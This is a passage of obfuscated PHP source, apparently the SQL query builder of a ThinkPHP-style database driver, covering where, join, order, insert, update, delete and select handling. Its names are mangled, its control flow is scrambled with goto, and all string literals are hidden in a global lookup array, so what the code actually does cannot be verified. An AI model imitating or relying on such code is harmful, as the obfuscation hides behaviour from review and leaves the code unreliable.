$b¥‡³°÷¾Ï[181]; } return $DÌöãÏ‡; } protected function parseTable($bÆ­ØšÎ¸Û) { $CñÑ««½ÓŠ =& $_SERVER[…ë˜õ]; if (is_array($bÆ­ØšÎ¸Û)) { $Eà’Ó‹™À× = array(); foreach ($bÆ­ØšÎ¸Û as $B¼…¼ÏĞÁ => $b¼‘ï­¦§) { if (!is_numeric($B¼…¼ÏĞÁ)) { $Eà’Ó‹™À×[] = $this->parseKey($B¼…¼ÏĞÁ) . $CñÑ««½ÓŠ[50] . $this->parseKey($b¼‘ï­¦§); } else { $Eà’Ó‹™À×[] = $this->parseKey($B¼…¼ÏĞÁ); } } $bÆ­ØšÎ¸Û = $Eà’Ó‹™À×; } elseif (is_string($bÆ­ØšÎ¸Û)) { if (strstr($bÆ­ØšÎ¸Û, $CñÑ««½ÓŠ[50])) { return $bÆ­ØšÎ¸Û; } $bÆ­ØšÎ¸Û = explode($CñÑ««½ÓŠ[47], $bÆ­ØšÎ¸Û); array_walk($bÆ­ØšÎ¸Û, array($this, $CñÑ««½ÓŠ[872])); } return $CñÑ««½ÓŠ[866] . trim(implode($CñÑ««½ÓŠ[962], $bÆ­ØšÎ¸Û), $CñÑ««½ÓŠ[380]) . $CñÑ««½ÓŠ[866]; } protected function parseWhere($e’ëê°äõ‘) { $D³µ‚“í® =& $_SERVER[…ë˜õ]; $F‡ğé¬Á³¼ = $D³µ‚“í®[33]; if (is_string($e’ëê°äõ‘)) { $F‡ğé¬Á³¼ = $e’ëê°äõ‘; } else { $dÙ…áæ‹˜³ = isset($e’ëê°äõ‘[$D³µ‚“í®[963]]) ? strtoupper($e’ëê°äõ‘[$D³µ‚“í®[963]]) : $D³µ‚“í®[33]; if (in_array($dÙ…áæ‹˜³, array($D³µ‚“í®[964], $D³µ‚“í®[965], $D³µ‚“í®[966]))) { $dÙ…áæ‹˜³ = $D³µ‚“í®[50] . $dÙ…áæ‹˜³ . $D³µ‚“í®[50]; unset($e’ëê°äõ‘[$D³µ‚“í®[963]]); } else { $dÙ…áæ‹˜³ = $D³µ‚“í®[967]; } foreach ($e’ëê°äõ‘ as $cˆâÎ§æ„ö => $cğ¿¶…Ã·) { $F‡ğé¬Á³¼ .= $D³µ‚“í®[273]; if (is_numeric($cˆâÎ§æ„ö)) { $cˆâÎ§æ„ö = $D³µ‚“í®[968]; } if (0 === strpos($cˆâÎ§æ„ö, $D³µ‚“í®[70])) { $F‡ğé¬Á³¼ .= $this->parseThinkWhere($cˆâÎ§æ„ö, $cğ¿¶…Ã·); } else { if (!preg_match($D³µ‚“í®[969], trim($cˆâÎ§æ„ö))) { think_exception(think_lang($D³µ‚“í®[970]) . $D³µ‚“í®[4] . $cˆâÎ§æ„ö); } $aƒÊñ†–µ = is_array($cğ¿¶…Ã·) && isset($cğ¿¶…Ã·[$D³µ‚“í®[971]]); $cˆâÎ§æ„ö = trim($cˆâÎ§æ„ö); if (strpos($cˆâÎ§æ„ö, $D³µ‚“í®[279])) { $B©ÀÆÅˆÍ¿ = explode($D³µ‚“í®[279], $cˆâÎ§æ„ö); $a†ëâš®ƒ— = array(); foreach ($B©ÀÆÅˆÍ¿ as $B²ëù¾ï => $b¹È‹Ş§×Ü) { $CƒïÇÛÀòÌ = $aƒÊñ†–µ ? $cğ¿¶…Ã·[$B²ëù¾ï] : $cğ¿¶…Ã·; $a†ëâš®ƒ—[] = $D³µ‚“í®[256] . $this->parseWhereItem($this->parseKey($b¹È‹Ş§×Ü), $CƒïÇÛÀòÌ) . $D³µ‚“í®[871]; } $F‡ğé¬Á³¼ .= implode($D³µ‚“í®[972], $a†ëâš®ƒ—); } elseif (strpos($cˆâÎ§æ„ö, $D³µ‚“í®[280])) { $B©ÀÆÅˆÍ¿ = explode($D³µ‚“í®[280], $cˆâÎ§æ„ö); $a†ëâš®ƒ— = array(); foreach ($B©ÀÆÅˆÍ¿ as $B²ëù¾ï => $b¹È‹Ş§×Ü) { $CƒïÇÛÀòÌ = $aƒÊñ†–µ ? $cğ¿¶…Ã·[$B²ëù¾ï] : $cğ¿¶…Ã·; $a†ëâš®ƒ—[] = $D³µ‚“í®[256] . $this->parseWhereItem($this->parseKey($b¹È‹Ş§×Ü), $CƒïÇÛÀòÌ) . $D³µ‚“í®[871]; } $F‡ğé¬Á³¼ .= implode($D³µ‚“í®[967], $a†ëâš®ƒ—); } else { $F‡ğé¬Á³¼ .= $this->parseWhereItem($this->parseKey($cˆâÎ§æ„ö), $cğ¿¶…Ã·); } } $F‡ğé¬Á³¼ .= $D³µ‚“í®[274] . $dÙ…áæ‹˜³; } $F‡ğé¬Á³¼ = substr($F‡ğé¬Á³¼, 0, -strlen($dÙ…áæ‹˜³)); } return empty($F‡ğé¬Á³¼) ? $D³µ‚“í®[33] : $D³µ‚“í®[973] . $F‡ğé¬Á³¼; } protected function parseWhereItem($B¡Ã×ËÈ­à, $B¾·§Õ›²‹) { $a„ÒŠ„Í× =& $_SERVER[…ë˜õ]; $cÔğ¡‹ÄÑÎ = $a„ÒŠ„Í×[33]; if (is_array($B¾·§Õ›²‹)) { if (is_string($B¾·§Õ›²‹[0])) { $eˆ™·¬âî = strtolower($B¾·§Õ›²‹[0]); if (in_array($B¾·§Õ›²‹[0], array($a„ÒŠ„Í×[957], $a„ÒŠ„Í×[974], $a„ÒŠ„Í×[975], $a„ÒŠ„Í×[976], $a„ÒŠ„Í×[977], $a„ÒŠ„Í×[978]))) { $cÔğ¡‹ÄÑÎ .= $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $B¾·§Õ›²‹[0] . $a„ÒŠ„Í×[50] . $this->parseValue($B¾·§Õ›²‹[1]); } elseif (preg_match($a„ÒŠ„Í×[979], $B¾·§Õ›²‹[0])) { $cÔğ¡‹ÄÑÎ .= $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $this->exp[$eˆ™·¬âî] . $a„ÒŠ„Í×[50] . $this->parseValue($B¾·§Õ›²‹[1]); } elseif (preg_match($a„ÒŠ„Í×[980], $B¾·§Õ›²‹[0])) { if (is_array($B¾·§Õ›²‹[1])) { $bİÓ’ô¡«Ì = isset($B¾·§Õ›²‹[2]) ? strtoupper($B¾·§Õ›²‹[2]) : $a„ÒŠ„Í×[965]; if (in_array($bİÓ’ô¡«Ì, array($a„ÒŠ„Í×[964], $a„ÒŠ„Í×[965], $a„ÒŠ„Í×[966]))) { $CÈ‡ŸáÂšö = array(); foreach ($B¾·§Õ›²‹[1] as $aÚÆÊ¿¥Ì) { $CÈ‡ŸáÂšö[] = $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $this->exp[$eˆ™·¬âî] . $a„ÒŠ„Í×[50] . $this->parseValue($aÚÆÊ¿¥Ì); } $cÔğ¡‹ÄÑÎ .= $a„ÒŠ„Í×[256] . implode($a„ÒŠ„Í×[50] . $bİÓ’ô¡«Ì . $a„ÒŠ„Í×[50], $CÈ‡ŸáÂšö) . $a„ÒŠ„Í×[871]; } } else { $cÔğ¡‹ÄÑÎ .= $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $this->exp[$eˆ™·¬âî] . $a„ÒŠ„Í×[50] . $this->parseValue($B¾·§Õ›²‹[1]); } } elseif ($a„ÒŠ„Í×[293] == $eˆ™·¬âî) { $cÔğ¡‹ÄÑÎ .= $a„ÒŠ„Í×[869] . $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $B¾·§Õ›²‹[1] . $a„ÒŠ„Í×[981]; } elseif (preg_match($a„ÒŠ„Í×[982], $B¾·§Õ›²‹[0])) { $cÔğ¡‹ÄÑÎ .= $B¾·§Õ›²‹[0]; } elseif (preg_match($a„ÒŠ„Í×[983], $B¾·§Õ›²‹[0])) { if (isset($B¾·§Õ›²‹[2]) && $a„ÒŠ„Í×[293] == $B¾·§Õ›²‹[2]) { $cÔğ¡‹ÄÑÎ .= $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $this->exp[$eˆ™·¬âî] . $a„ÒŠ„Í×[50] . $B¾·§Õ›²‹[1]; } else { if (is_string($B¾·§Õ›²‹[1])) { $B¾·§Õ›²‹[1] = explode($a„ÒŠ„Í×[47], $B¾·§Õ›²‹[1]); } $bš¶áÕ«Ú = implode($a„ÒŠ„Í×[47], $this->parseValue($B¾·§Õ›²‹[1])); $cÔğ¡‹ÄÑÎ .= $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $this->exp[$eˆ™·¬âî] . $a„ÒŠ„Í×[869] . $bš¶áÕ«Ú . $a„ÒŠ„Í×[871]; } } elseif (preg_match($a„ÒŠ„Í×[984], $B¾·§Õ›²‹[0])) { $d†—Ú™º¾ = is_string($B¾·§Õ›²‹[1]) ? explode($a„ÒŠ„Í×[47], $B¾·§Õ›²‹[1]) : $B¾·§Õ›²‹[1]; $cÔğ¡‹ÄÑÎ .= $a„ÒŠ„Í×[869] . $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $this->exp[$eˆ™·¬âî] . $a„ÒŠ„Í×[50] . $this->parseValue($d†—Ú™º¾[0]) . $a„ÒŠ„Í×[967] . $this->parseValue($d†—Ú™º¾[1]) . $a„ÒŠ„Í×[274]; } else { think_exception(think_lang($a„ÒŠ„Í×[970]) . $a„ÒŠ„Í×[4] . $B¾·§Õ›²‹[0]); } } else { $eˆŸ›Òƒî = count($B¾·§Õ›²‹); $F­í§Ÿ¸»‚ = $a„ÒŠ„Í×[33]; if (is_string($B¾·§Õ›²‹[$eˆŸ›Òƒî - 1])) { $F­í§Ÿ¸»‚ = isset($B¾·§Õ›²‹[$eˆŸ›Òƒî - 1]) ? strtoupper($B¾·§Õ›²‹[$eˆŸ›Òƒî - 1]) : $a„ÒŠ„Í×[33]; if (in_array($F­í§Ÿ¸»‚, array($a„ÒŠ„Í×[964], $a„ÒŠ„Í×[965], $a„ÒŠ„Í×[966]))) { $eˆŸ›Òƒî = $eˆŸ›Òƒî - 1; } } else { $F­í§Ÿ¸»‚ = $a„ÒŠ„Í×[964]; } for ($d ›±ğÚ·ß = 0; $d ›±ğÚ·ß < $eˆŸ›Òƒî; $d ›±ğÚ·ß++) { $d†—Ú™º¾ = is_array($B¾·§Õ›²‹[$d ›±ğÚ·ß]) ? $B¾·§Õ›²‹[$d ›±ğÚ·ß][1] : $B¾·§Õ›²‹[$d ›±ğÚ·ß]; if ($a„ÒŠ„Í×[293] == strtolower($B¾·§Õ›²‹[$d ›±ğÚ·ß][0])) { $cÔğ¡‹ÄÑÎ .= $a„ÒŠ„Í×[256] . $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $d†—Ú™º¾ . $a„ÒŠ„Í×[981] . $F­í§Ÿ¸»‚ . $a„ÒŠ„Í×[50]; } else { $Aô›á÷• = is_array($B¾·§Õ›²‹[$d ›±ğÚ·ß]) ? $this->exp[strtolower($B¾·§Õ›²‹[$d ›±ğÚ·ß][0])] : $a„ÒŠ„Í×[957]; if (!$Aô›á÷• && is_array($B¾·§Õ›²‹[$d ›±ğÚ·ß]) && in_array($B¾·§Õ›²‹[$d ›±ğÚ·ß][0], array($a„ÒŠ„Í×[957], $a„ÒŠ„Í×[974], $a„ÒŠ„Í×[975], $a„ÒŠ„Í×[976], $a„ÒŠ„Í×[977], $a„ÒŠ„Í×[978]))) { $Aô›á÷• = $B¾·§Õ›²‹[$d ›±ğÚ·ß][0]; } $cÔğ¡‹ÄÑÎ .= $a„ÒŠ„Í×[256] . $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[50] . $Aô›á÷• . $a„ÒŠ„Í×[50] . $this->parseValue($d†—Ú™º¾) . $a„ÒŠ„Í×[981] . $F­í§Ÿ¸»‚ . $a„ÒŠ„Í×[50]; } } $cÔğ¡‹ÄÑÎ = substr($cÔğ¡‹ÄÑÎ, 0, -4); } } else { $cÔğ¡‹ÄÑÎ .= $B¡Ã×ËÈ­à . $a„ÒŠ„Í×[985] . $this->parseValue($B¾·§Õ›²‹); } return $cÔğ¡‹ÄÑÎ; } protected function parseThinkWhere($F¾Ô©ˆã¾×, $eÊ˜¥ÒğÎ) { $c–ŒˆÊ˜Æ =& $_SERVER[…ë˜õ]; $e¸¹ê¼£ï¦ = $c–ŒˆÊ˜Æ[33]; switch ($F¾Ô©ˆã¾×) { case $c–ŒˆÊ˜Æ[348]: $e¸¹ê¼£ï¦ = $eÊ˜¥ÒğÎ; break; case $c–ŒˆÊ˜Æ[968]: $e¸¹ê¼£ï¦ = is_string($eÊ˜¥ÒğÎ) ? $eÊ˜¥ÒğÎ : substr($this->parseWhere($eÊ˜¥ÒğÎ), 6); break; case $c–ŒˆÊ˜Æ[986]: parse_str($eÊ˜¥ÒğÎ, $Fâ…‡Üâ); if (isset($Fâ…‡Üâ[$c–ŒˆÊ˜Æ[963]])) { $aÃºáƒíáï = $c–ŒˆÊ˜Æ[50] . strtoupper($Fâ…‡Üâ[$c–ŒˆÊ˜Æ[963]]) . $c–ŒˆÊ˜Æ[50]; unset($Fâ…‡Üâ[$c–ŒˆÊ˜Æ[963]]); } else { $aÃºáƒíáï = $c–ŒˆÊ˜Æ[967]; } $DÑ¦Ğ¨ ¤ = array(); foreach ($Fâ…‡Üâ as $bë£ÂÆƒÀ => $eíØÜÄÑÈ) { $DÑ¦Ğ¨ ¤[] = $this->parseKey($bë£ÂÆƒÀ) . $c–ŒˆÊ˜Æ[985] . $this->parseValue($eíØÜÄÑÈ); } $e¸¹ê¼£ï¦ = implode($aÃºáƒíáï, $DÑ¦Ğ¨ ¤); break; } return $e¸¹ê¼£ï¦; } protected function parseLimit($c²Ù³Ş¨Ç¨) { $eØÉÎÈÙêŠ =& $_SERVER[…ë˜õ]; return !empty($c²Ù³Ş¨Ç¨) ? $eØÉÎÈÙêŠ[48] . $c²Ù³Ş¨Ç¨ . $eØÉÎÈÙêŠ[50] : $eØÉÎÈÙêŠ[33]; } protected function parseJoin($Fçˆ’“½ÎÛ) { $f«Å„‹ââğ =& $_SERVER[…ë˜õ]; $DÔ†ò•…½— = $f«Å„‹ââğ[33]; if (!empty($Fçˆ’“½ÎÛ)) { if (is_array($Fçˆ’“½ÎÛ)) { foreach ($Fçˆ’“½ÎÛ as $aó·¤˜¸ => $A—Âéë§°) { if (!1 !== stripos($A—Âéë§°, $f«Å„‹ââğ[987])) { $DÔ†ò•…½— .= $f«Å„‹ââğ[50] . $A—Âéë§°; } else { $DÔ†ò•…½— .= $f«Å„‹ââğ[988] . $A—Âéë§°; } } } else { $DÔ†ò•…½— .= $f«Å„‹ââğ[988] . $Fçˆ’“½ÎÛ; } } $DÔ†ò•…½— = preg_replace($f«Å„‹ââğ[989], think_config($f«Å„‹ââğ[895]) . $f«Å„‹ââğ[990], $DÔ†ò•…½—); return $DÔ†ò•…½—; } protected function parseOrder($fó·ØÛØ–) { $eá¾¹ºÅ« =& $_SERVER[…ë˜õ]; if (is_array($fó·ØÛØ–)) { $bŞ»¹“÷ê = array(); foreach ($fó·ØÛØ– as $BÉ¸‹êéî => $a›„¤àâğ•) { if (is_numeric($BÉ¸‹êéî)) { $bŞ»¹“÷ê[] = $this->parseKey($a›„¤àâğ•); } else { $a›„¤àâğ• = in_array(strtoupper(trim($a›„¤àâğ•)), array($eá¾¹ºÅ«[991], $eá¾¹ºÅ«[992])) ? $eá¾¹ºÅ«[50] . $a›„¤àâğ• : $eá¾¹ºÅ«[33]; if (preg_match($eá¾¹ºÅ«[993], $BÉ¸‹êéî)) { $bŞ»¹“÷ê[] = $this->parseKey($BÉ¸‹êéî) . $a›„¤àâğ•; } else { think_exception($eá¾¹ºÅ«[994] . $BÉ¸‹êéî); } } } $fó·ØÛØ– = implode($eá¾¹ºÅ«[47], $bŞ»¹“÷ê); } return !empty($fó·ØÛØ–) ? $eá¾¹ºÅ«[995] . $fó·ØÛØ– : $eá¾¹ºÅ«[33]; } protected function parseGroup($F¡ŞÈËè³) { $cøë¶Çå  =& $_SERVER[…ë˜õ]; return !empty($F¡ŞÈËè³) ? $cøë¶Çå [996] . $F¡ŞÈËè³ : $cøë¶Çå [33]; } protected function parseHaving($E•â‚‚Äø) { $A•œ¹ë–‘‹ =& $_SERVER[…ë˜õ]; return !empty($E•â‚‚Äø) ? $A•œ¹ë–‘‹[997] . $E•â‚‚Äø : $A•œ¹ë–‘‹[33]; } protected function parseComment($E¾ º’‚ª) { $b›½÷ì¦†ª =& $_SERVER[…ë˜õ]; return !empty($E¾ º’‚ª) ? $b›½÷ì¦†ª[998] . $E¾ º’‚ª . $b›½÷ì¦†ª[999] : $b›½÷ì¦†ª[33]; } protected function parseDistinct($cİ¿ÙÉ‘ÂÂ) { $a¡åª¶¹ =& $_SERVER[…ë˜õ]; return !empty($cİ¿ÙÉ‘ÂÂ) ? $a¡åª¶¹[1000] : $a¡åª¶¹[33]; } protected function parseUnion($bÆÔÊñø•) { $aİï‰èğ ò =& $_SERVER[…ë˜õ]; if (empty($bÆÔÊñø•)) { return $aİï‰èğ ò[33]; } if (isset($bÆÔÊñø•[$aİï‰èğ ò[344]])) { $e×¢­ŒÅÜ´ = $aİï‰èğ ò[1001]; unset($bÆÔÊñø•[$aİï‰èğ ò[344]]); } else { $e×¢­ŒÅÜ´ = $aİï‰èğ ò[1002]; } foreach ($bÆÔÊñø• as $DïÓí‰Œ™‚) { $D™¶ÕÏÑ„ê[] = $e×¢­ŒÅÜ´ . (is_array($DïÓí‰Œ™‚) ? $this->buildSelectSql($DïÓí‰Œ™‚) : $DïÓí‰Œ™‚); } return implode($aİï‰èğ ò[50], $D™¶ÕÏÑ„ê); } public function insert($EÒÏÛÂÍË÷, $c¾”¡„…Óí = array(), $aÁ›–ğŒÊÛ = false) { goto b‰÷„‡Ïëé; FÜ´ğ¶´ß: $Eõ¥¢öÍÖ .= $this->parseComment(!empty($c¾”¡„…Óí[$dÍÕòÄÖŸ¸[350]]) ? $c¾”¡„…Óí[$dÍÕòÄÖŸ¸[350]] : $dÍÕòÄÖŸ¸[33]); return $this->execute($Eõ¥¢öÍÖ, $this->parseBind(!empty($c¾”¡„…Óí[$dÍÕòÄÖŸ¸[281]]) ? $c¾”¡„…Óí[$dÍÕòÄÖŸ¸[281]] : array())); goto få·äŠó…; b‰÷„‡Ïëé: $dÍÕòÄÖŸ¸ =& $_SERVER[…ë˜õ]; $cÓ»˜Óª = $DÔâÃÚ›‚Ğ = array(); $this->model = $c¾”¡„…Óí[$dÍÕòÄÖŸ¸[277]]; goto EòÎÔ¥¿Ê; EòÎÔ¥¿Ê: foreach ($EÒÏÛÂÍË÷ as $AâñÚ¶‹ç¨ => $dôÔ“¶ÀÏÍ) { if (is_array($dôÔ“¶ÀÏÍ) && $dÍÕòÄÖŸ¸[293] == $dôÔ“¶ÀÏÍ[0]) { $DÔâÃÚ›‚Ğ[] = $this->parseKey($AâñÚ¶‹ç¨); $cÓ»˜Óª[] = $dôÔ“¶ÀÏÍ[1]; } elseif (is_scalar($dôÔ“¶ÀÏÍ) || is_null($dôÔ“¶ÀÏÍ)) { $DÔâÃÚ›‚Ğ[] = $this->parseKey($AâñÚ¶‹ç¨); $cÓ»˜Óª[] = $this->parseValue($dôÔ“¶ÀÏÍ); } } $Eõ¥¢öÍÖ = ($aÁ›–ğŒÊÛ ? $dÍÕòÄÖŸ¸[873] : $dÍÕòÄÖŸ¸[874]) . $dÍÕòÄÖŸ¸[875] . $this->parseTable($c¾”¡„…Óí[$dÍÕòÄÖŸ¸[275]]) . $dÍÕòÄÖŸ¸[869] . implode($dÍÕòÄÖŸ¸[47], $DÔâÃÚ›‚Ğ) . $dÍÕòÄÖŸ¸[870] . implode($dÍÕòÄÖŸ¸[47], $cÓ»˜Óª) . $dÍÕòÄÖŸ¸[871]; $Eõ¥¢öÍÖ .= $this->parseLock(isset($c¾”¡„…Óí[$dÍÕòÄÖŸ¸[818]]) ? $c¾”¡„…Óí[$dÍÕòÄÖŸ¸[818]] : !1); goto FÜ´ğ¶´ß; få·äŠó…: } public function selectInsert($aˆºä´µù, $fŒÎˆ’­æ‡, $B‘–Ó‰É‡± = array()) { goto a×™©¢³®ˆ; b¼›ùğ…·: return $this->execute($BˆÙÄêé‡À, $this->parseBind(!empty($B‘–Ó‰É‡±[$F™Ğ½—ºå[281]]) ? $B‘–Ó‰É‡±[$F™Ğ½—ºå[281]] : array())); goto BÆ¡À˜¡¡ë; a×™©¢³®ˆ: $F™Ğ½—ºå =& $_SERVER[…ë˜õ]; $this->model = $B‘–Ó‰É‡±[$F™Ğ½—ºå[277]]; if (is_string($aˆºä´µù)) { $aˆºä´µù = explode($F™Ğ½—ºå[47], $aˆºä´µù); } goto fƒåÚ·¿·À; fƒåÚ·¿·À: array_walk($aˆºä´µù, array($this, $F™Ğ½—ºå[872])); $BˆÙÄêé‡À = $F™Ğ½—ºå[1003] . $this->parseTable($fŒÎˆ’­æ‡) . $F™Ğ½—ºå[869] . implode($F™Ğ½—ºå[47], $aˆºä´µù) . $F™Ğ½—ºå[981]; $BˆÙÄêé‡À .= $this->buildSelectSql($B‘–Ó‰É‡±); goto b¼›ùğ…·; BÆ¡À˜¡¡ë: } public function update($E…‰††´, $Cè¥¬ø ®Ö) { $FÕÂÒ¬Ã¬× =& $_SERVER[…ë˜õ]; $this->model = $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[277]]; $DÏ£ ”ÛŒ¢ = $FÕÂÒ¬Ã¬×[1004] . $this->parseTable($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[275]]) . $this->parseSet($E…‰††´) . $this->parseWhere(!empty($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[271]]) ? $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[271]] : $FÕÂÒ¬Ã¬×[33]) . $this->parseOrder(!empty($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[361]]) ? $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[361]] : $FÕÂÒ¬Ã¬×[33]) . $this->parseLimit(!empty($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[288]]) ? $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[288]] : $FÕÂÒ¬Ã¬×[33]) . $this->parseLock(isset($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[818]]) ? $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[818]] : !1) . $this->parseComment(!empty($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[350]]) ? $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[350]] : $FÕÂÒ¬Ã¬×[33]); return $this->execute($DÏ£ ”ÛŒ¢, $this->parseBind(!empty($Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[281]]) ? $Cè¥¬ø ®Ö[$FÕÂÒ¬Ã¬×[281]] : array())); } public function delete($CÀÇÂ¤Åº’ = array()) { $FÇËäî¶¶ =& $_SERVER[…ë˜õ]; $this->model = $CÀÇÂ¤Åº’[$FÇËäî¶¶[277]]; $Eä‡‡‹ï³õ = $FÇËäî¶¶[1005] . $this->parseTable($CÀÇÂ¤Åº’[$FÇËäî¶¶[275]]) . $this->parseWhere(!empty($CÀÇÂ¤Åº’[$FÇËäî¶¶[271]]) ? $CÀÇÂ¤Åº’[$FÇËäî¶¶[271]] : $FÇËäî¶¶[33]) . $this->parseOrder(!empty($CÀÇÂ¤Åº’[$FÇËäî¶¶[361]]) ? $CÀÇÂ¤Åº’[$FÇËäî¶¶[361]] : $FÇËäî¶¶[33]) . $this->parseLimit(!empty($CÀÇÂ¤Åº’[$FÇËäî¶¶[288]]) ? $CÀÇÂ¤Åº’[$FÇËäî¶¶[288]] : $FÇËäî¶¶[33]) . $this->parseLock(isset($CÀÇÂ¤Åº’[$FÇËäî¶¶[818]]) ? $CÀÇÂ¤Åº’[$FÇËäî¶¶[818]] : !1) . $this->parseComment(!empty($CÀÇÂ¤Åº’[$FÇËäî¶¶[350]]) ? $CÀÇÂ¤Åº’[$FÇËäî¶¶[350]] : $FÇËäî¶¶[33]); return $this->execute($Eä‡‡‹ï³õ, $this->parseBind(!empty($CÀÇÂ¤Åº’[$FÇËäî¶¶[281]]) ? $CÀÇÂ¤Åº’[$FÇËäî¶¶[281]] : array())); } public function select($E”ßßøëÚ = array()) { goto DôĞÂÊÂÒß; e¹ñ¤§ÀêÃ: if ($f¹Û •‚ì­ && !1 !== $DÆîï´¯Ôà) { think_cache($EİîÊÖ¨¢, $DÆîï´¯Ôà, $f¹Û •‚ì­); } return $DÆîï´¯Ôà; goto d‹İ¬Ã¦Ø¡; c°Ş›²œ÷: $f¹Û •‚ì­ = isset($E”ßßøëÚ[$CÄò¼¿áÒñ[345]]) ? $E”ßßøëÚ[$CÄò¼¿áÒñ[345]] : !1; if ($f¹Û •‚ì­) { $EİîÊÖ¨¢ = is_string($f¹Û •‚ì­[$CÄò¼¿áÒñ[92]]) ? $f¹Û •‚ì­[$CÄò¼¿áÒñ[92]] : $CÄò¼¿áÒñ[1006] . md5($FÈ‘ÍªÌï); $CâÕ»»•‹Â = think_cache($EİîÊÖ¨¢, $CÄò¼¿áÒñ[33], $f¹Û •‚ì­); if (!1 !== $CâÕ»»•‹Â) { return $CâÕ»»•‹Â; } } $DÆîï´¯Ôà = $this->query($FÈ‘ÍªÌï, $this->parseBind(!empty($E”ßßøëÚ[$CÄò¼¿áÒñ[281]]) ? $E”ßßøëÚ[$CÄò¼¿áÒñ[281]] : array())); goto e¹ñ¤§ÀêÃ; DôĞÂÊÂÒß: $CÄò¼¿áÒñ =& $_SERVER[…ë˜õ]; $this->model = $E”ßßøëÚ[$CÄò¼¿áÒñ[277]]; $FÈ‘ÍªÌï = $this->buildSelectSql($E”ßßøëÚ); goto c°Ş›²œ÷; d‹İ¬Ã¦Ø¡: } public function buildSelectSql($D‹’õÕŞ = array()) { goto e¦ÍÅÇœš–; e¦ÍÅÇœš–: $eÅÊÄÎÄêë =& $_SERVER[…ë˜õ]; if (isset($D‹’õÕŞ[$eÅÊÄÎÄêë[349]])) { if (strpos($D‹’õÕŞ[$eÅÊÄÎÄêë[349]], $eÅÊÄÎÄêë[47])) { list($fŒÊ‘›À™³, $Bæéàæ–¯Á) = explode($eÅÊÄÎÄêë[47], $D‹’õÕŞ[$eÅÊÄÎÄêë[349]]); } else { $fŒÊ‘›À™³ = $D‹’õÕŞ[$eÅÊÄÎÄêë[349]]; } $fŒÊ‘›À™³ = $fŒÊ‘›À™³ ? $fŒÊ‘›À™³ : 1; $Bæéàæ–¯Á = isset($Bæéàæ–¯Á) ? $Bæéàæ–¯Á : (is_numeric($D‹’õÕŞ[$eÅÊÄÎÄêë[288]]) ? $D‹’õÕŞ[$eÅÊÄÎÄêë[288]] : 20); $CÄ¼Ñí¼ŠÁ = $Bæéàæ–¯Á * ((int) $fŒÊ‘›À™³ - 1); $D‹’õÕŞ[$eÅÊÄÎÄêë[288]] = $CÄ¼Ñí¼ŠÁ . $eÅÊÄÎÄêë[47] . $Bæéàæ–¯Á; } if (think_config($eÅÊÄÎÄêë[1007])) { $E¦‚É»ŒåÂ = $eÅÊÄÎÄêë[1008] . md5(serialize($D‹’õÕŞ)); $B†ÖŠÑá = think_cache($E¦‚É»ŒåÂ); if ($B†ÖŠÑá) { return $B†ÖŠÑá; } } goto e£·Ë“®ã¥; F©©··½°ˆ: return $b¦ĞÛ®“ª‡; goto díß•½˜á£; e£·Ë“®ã¥: $b¦ĞÛ®“ª‡ = $this->parseSql($this->selectSql, $D‹’õÕŞ); $b¦ĞÛ®“ª‡ .= $this->parseLock(isset($D‹’õÕŞ[$eÅÊÄÎÄêë[818]]) ? $D‹’õÕŞ[$eÅÊÄÎÄêë[818]] : !1); if (isset($E¦‚É»ŒåÂ)) { think_cache($E¦‚É»ŒåÂ, $b¦ĞÛ®“ª‡); } goto F©©··½°ˆ; díß•½˜á£: } public function parseSql($FµÈğ©ÜÄ‡, $F»îÛ‰å¤í = array()) { $fÆ—¥ôÆè¹ =& $_SERVER[…ë˜õ]; $FµÈğ©ÜÄ‡ = str_replace(array($fÆ—¥ôÆè¹[1009], $fÆ—¥ôÆè¹[1010], $fÆ—¥ôÆè¹[1011], $fÆ—¥ôÆè¹[1012], $fÆ—¥ôÆè¹[1013], $fÆ—¥ôÆè¹[1014], $fÆ—¥ôÆè¹[1015], $fÆ—¥ôÆè¹[1016], $fÆ—¥ôÆè¹[1017], $fÆ—¥ôÆè¹[1018], $fÆ—¥ôÆè¹[1019]), array($this->parseTable("{$F»îÛ‰å¤í[$fÆ—¥ôÆè¹[275]]}"), $this->parseDistinct(isset($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[1020]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[1020]] : !1), $this->parseField(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[269]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[269]] : $fÆ—¥ôÆè¹[181]), $this->parseJoin(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[278]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[278]] : $fÆ—¥ôÆè¹[33]), $this->parseWhere(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[271]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[271]] : $fÆ—¥ôÆè¹[33]), $this->parseGroup(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[1021]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[1021]] : $fÆ—¥ôÆè¹[33]), $this->parseHaving(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[1022]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[1022]] : 